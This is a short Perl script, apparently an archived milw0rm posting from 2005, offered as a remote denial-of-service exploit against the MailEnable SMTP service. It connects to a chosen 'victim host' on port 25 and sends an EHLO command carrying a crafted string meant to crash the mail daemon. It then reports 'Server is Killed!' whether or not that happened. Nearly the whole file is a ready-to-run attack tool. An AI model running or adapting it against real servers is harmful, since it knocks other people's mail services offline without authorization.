#!/usr/bin/perl
##################################################################################
#MailEnable (Enterprise <= 1.04)-(Professional <= 1.54 SMTPd remote DOS exploit  #        
#                                                                                #
#                                                                                #   
#this tools causes the crash of the demon SMTP of mailenable                     #
#the bug and' caused he/she knows an unicode string sent to the command          #
#EHLO                                                                            #
#                                                                                #
#BUG discovered By CorryL                                                        # 
#Coded by CorryL                                                                 #  
#  	                                                  info: www.x0n3-h4ck.org#
##################################################################################
use IO::Socket; 
use Getopt::Std; getopts('h:', \%args);


if (defined($args{'h'})) { $host = $args{'h'}; }

print STDERR "\n-=[MailEnable (Enterprise & Professional) SMTPd remote DOS exploit]=-\n";
print STDERR "-=[                                                               ]=-\n";
print STDERR "-=[ Discovered & Coded by CorryL            info:www.x0n3-h4ck.org]=-\n";
print STDERR "-=[ irc.xoned.net #x0n3-h4ck                 corryl80[at]gmail.com]=-\n\n";

if (!defined($host)) {
Usage();
}

$bof = "\0x99";
print "[+]Connecting to the Host $host\n";
$socket = new IO::Socket::INET (PeerAddr => "$host",
                                PeerPort => 25,
                                Proto => 'tcp');
                                die unless $socket;
                                print "[+]Sending Unicode String\n";
                                print $socket "EHLO $bof\r\n";
                                print "[+]Server is Killed!\n";  
                              

close;

sub Usage {
print STDERR "Usage:
-h Victim host.\n\n";
exit;
}

# milw0rm.com [2005-04-05]